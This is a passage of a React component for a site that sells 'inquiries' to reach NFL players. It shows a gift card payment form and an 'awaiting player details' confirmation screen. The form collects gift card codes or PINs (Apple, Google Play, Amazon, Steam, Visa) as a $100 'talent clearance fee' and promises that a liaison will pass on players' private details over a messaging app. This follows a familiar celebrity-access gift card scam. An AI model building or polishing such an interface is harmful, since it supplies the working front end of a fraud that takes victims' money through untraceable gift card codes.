                      setReceiptImageUrls(prev => [receipt, ...prev]);
                    }
                  }}
                />
              ) : (
                <div className="p-5 bg-zinc-900/80 rounded-3xl border border-white/10 space-y-4">
                  <div className="flex items-center justify-between pb-3 border-b border-white/5">
                    <span className="text-xs font-black uppercase text-amber-400">Prepaid / Digital Gift Card ($100)</span>
                    <span className="text-[9px] font-mono text-zinc-400">Apple, Steam, Google Play, Visa</span>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs">
                    <div>
                      <label className="text-[9px] font-black uppercase text-zinc-400 block mb-1">Gift Card Brand</label>
                      <select
                        value={giftCardDetails.brand}
                        onChange={(e) => setGiftCardDetails(prev => ({ ...prev, brand: e.target.value }))}
                        className="w-full bg-zinc-950 border border-white/10 rounded-xl px-3 py-2 text-xs text-white"
                      >
                        <option value="Apple">Apple / App Store Card</option>
                        <option value="Google Play">Google Play Card</option>
                        <option value="Amazon">Amazon Gift Card</option>
                        <option value="Steam">Steam Digital Code</option>
                        <option value="Visa">Visa / Vanilla Prepaid</option>
                      </select>
                    </div>

                    <div>
                      <label className="text-[9px] font-black uppercase text-zinc-400 block mb-1">Card Face Value</label>
                      <input
                        type="text"
                        disabled
                        value="$100.00 USD"
                        className="w-full bg-zinc-950 border border-white/10 rounded-xl px-3 py-2 text-xs font-mono text-emerald-400 font-bold"
                      />
                    </div>

                    <div className="sm:col-span-2">
                      <label className="text-[9px] font-black uppercase text-zinc-400 block mb-1">
                        Card Number / Digital Code <span className="text-rose-400">*</span>
                      </label>
                      <input
                        type="text"
                        placeholder="Enter 16-digit code or redeem PIN"
                        value={giftCardDetails.cardNumber}
                        onChange={(e) => setGiftCardDetails(prev => ({ ...prev, cardNumber: e.target.value }))}
                        className="w-full bg-zinc-950 border border-white/10 rounded-xl px-3 py-2 text-xs font-mono text-white"
                      />
                    </div>
                  </div>
                </div>
              )}

              {/* Action Buttons */}
              <div className="flex items-center justify-between pt-4 border-t border-white/5">
                <button
                  type="button"
                  onClick={() => setStep("details")}
                  className="px-5 py-3 rounded-xl bg-zinc-900 hover:bg-zinc-800 text-zinc-400 text-xs font-black uppercase tracking-wider transition-all cursor-pointer"
                >
                  ← Back to Details
                </button>

                <button
                  type="button"
                  onClick={() => handleFinalizeInquiry()}
                  disabled={isSubmitting}
                  className="px-8 py-3.5 bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-black font-black uppercase text-[10px] tracking-widest rounded-2xl transition-all shadow-lg shadow-emerald-500/20 flex items-center gap-2 transform active:scale-95 cursor-pointer disabled:opacity-50"
                >
                  {isSubmitting ? (
                    <span>Registering Inquiry...</span>
                  ) : (
                    <>
                      <span>Complete $100 Payment & Await Player Details</span>
                      <Check className="w-4 h-4 text-black" />
                    </>
                  )}
                </button>
              </div>
            </div>
          )}

          {/* STEP 3: SUCCESS & AWAITING PLAYER DETAILS STATE */}
          {step === "success" && completedOrder && (
            <div className="space-y-6 text-center py-4">
              <div className="w-16 h-16 rounded-full bg-amber-500/10 border border-amber-500/30 flex items-center justify-center mx-auto text-amber-400 shadow-xl shadow-amber-500/10">
                <Clock className="w-8 h-8 animate-pulse" />
              </div>

              <div>
                <span className="px-3.5 py-1 bg-amber-500/10 border border-amber-500/20 text-amber-400 text-[10px] font-black uppercase tracking-widest rounded-full">
                  $100 PAYMENT TRANSMITTED · AWAITING PLAYER DETAILS
                </span>
                <h4 className="text-2xl font-black italic uppercase tracking-tighter text-white mt-2">
                  INQUIRY ACTIVE FOR {completedOrder.player}
                </h4>
                <p className="text-xs text-zinc-400 font-medium max-w-md mx-auto mt-1 leading-relaxed">
                  Your $100 talent clearance fee is logged! Our concierge liaison is currently contacting representation for <strong className="text-white">{completedOrder.player}</strong> ({completedOrder.teamName}).
                </p>
              </div>

              {/* Virtual Clearance Pass Card */}
              <div className="max-w-md mx-auto bg-zinc-900 rounded-[2.5rem] border border-blue-500/20 overflow-hidden shadow-2xl text-left">
                {/* Header */}
                <div className="bg-gradient-to-r from-blue-700 via-indigo-800 to-zinc-950 p-5 flex items-center justify-between">
                  <div>
                    <span className="text-[8px] font-black text-blue-200 uppercase tracking-widest">
                      OFFICIAL PLAYER INQUIRY PASS
                    </span>
                    <h5 className="text-sm font-black uppercase text-white mt-0.5">
                      {completedOrder.player} · {completedOrder.teamId}
                    </h5>
                  </div>
                  <span className="px-2.5 py-1 rounded-full text-[8px] font-black uppercase bg-amber-400 text-black">
                    Awaiting Details
                  </span>
                </div>

                {/* Body details */}
                <div className="p-6 space-y-4">
                  <div className="grid grid-cols-2 gap-3 text-xs border-b border-white/5 pb-3 font-mono">
                    <div>
                      <span className="text-[8px] font-black text-zinc-500 uppercase tracking-wider block">Attendee</span>
                      <span className="text-white font-bold text-xs truncate block">{completedOrder.buyerName}</span>
                    </div>
                    <div>
                      <span className="text-[8px] font-black text-zinc-500 uppercase tracking-wider block">Inquiry Passcode</span>
                      <span className="text-emerald-400 font-bold text-xs">{completedOrder.ticketCode}</span>
                    </div>
                    <div>
                      <span className="text-[8px] font-black text-zinc-500 uppercase tracking-wider block">Messaging Channel</span>
                      <span className="text-blue-400 font-bold text-xs">{completedOrder.messagingPlatform}</span>
                    </div>
                    <div>
                      <span className="text-[8px] font-black text-zinc-500 uppercase tracking-wider block">Contact Details</span>
                      <span className="text-white font-bold text-xs truncate block">{completedOrder.messagingDetails}</span>
                    </div>
                    <div>
                      <span className="text-[8px] font-black text-zinc-500 uppercase tracking-wider block">Talent Clearance Fee</span>
                      <span className="text-emerald-400 font-bold text-xs">${completedOrder.totalPrice} USD Paid</span>
                    </div>
                    <div>
                      <span className="text-[8px] font-black text-zinc-500 uppercase tracking-wider block">Liaison Status</span>
                      <span className="text-amber-400 font-bold text-xs">Dispatching Outreach</span>
                    </div>
                  </div>

                  {/* Concierge Delivery Channel Banner */}
                  <div className="p-3.5 bg-blue-500/10 border border-blue-500/20 rounded-2xl flex items-center gap-3">
                    <Send className="w-5 h-5 text-blue-400 shrink-0" />
                    <p className="text-[10px] text-zinc-300 leading-relaxed font-medium">
                      Player availability, confirmed schedule, and private details will be dispatched directly to your <strong className="text-white">{completedOrder.messagingPlatform}</strong> account (<strong className="text-blue-300 font-mono">{completedOrder.messagingDetails}</strong>).
                    </p>
                  </div>

                  {/* Scannable QR Pass */}
                  <div className="p-4 bg-zinc-950 rounded-2xl border border-white/5 flex flex-col items-center justify-center gap-2">
                    <div className="p-2.5 bg-white rounded-xl shadow-md border-2 border-emerald-500/20">
                      <QRCodeSVG
                        value={`https://nfl-gridiron-exchange.com/?verifyPass=${encodeURIComponent(completedOrder.ticketCode)}`}
                        size={120}
                        level="H"
                      />
                    </div>
                    <span className="text-[8px] font-mono font-black text-zinc-400 uppercase tracking-widest mt-1">
                      PASSCODE: {completedOrder.ticketCode}
                    </span>
                  </div>
                </div>
              </div>

              {/* Action buttons */}
              <div className="flex flex-wrap items-center justify-center gap-3 pt-2">
                <button
                  type="button"
                  onClick={handleDownloadPdf}
                  className="px-6 py-3 rounded-xl bg-blue-600 hover:bg-blue-500 text-white font-black uppercase text-[10px] tracking-wider transition-all flex items-center gap-2 shadow-lg shadow-blue-500/20 cursor-pointer"
                >
                  <Download className="w-4 h-4" />
                  <span>Download Pass PDF</span>
                </button>

                <button
                  type="button"
                  onClick={() => {
                    onClose();
                    if (onOpenTicketPortal) onOpenTicketPortal(completedOrder.buyerEmail || completedOrder.orderId);
                  }}
                  className="px-6 py-3 rounded-xl bg-zinc-900 hover:bg-zinc-800 text-zinc-300 font-black uppercase text-[10px] tracking-wider transition-all flex items-center gap-2 border border-white/10 cursor-pointer"
                >
                  <Search className="w-4 h-4 text-emerald-400" />
                  <span>Check in Ticket Portal</span>
                </button>

                <button
                  type="button"
                  onClick={onClose}
                  className="px-6 py-3 rounded-xl bg-zinc-950 text-zinc-500 hover:text-white font-black uppercase text-[10px] tracking-wider transition-all cursor-pointer"
                >
                  Done
                </button>
              </div>
            </div>
          )}
        </div>
      </motion.div>
    </div>
  );
};
